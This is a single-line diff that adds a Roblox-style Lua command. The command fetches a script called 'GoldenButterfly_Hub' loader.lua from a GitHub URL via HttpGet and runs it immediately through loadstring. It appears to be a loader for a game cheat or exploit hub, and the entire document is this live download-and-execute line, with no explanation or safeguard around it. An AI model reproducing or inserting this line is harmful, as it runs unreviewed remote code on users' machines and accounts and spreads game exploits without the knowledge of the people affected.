@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://github.com/MrSun966/GoldenButterfly_Hub/blob/main/loader.lua"))()
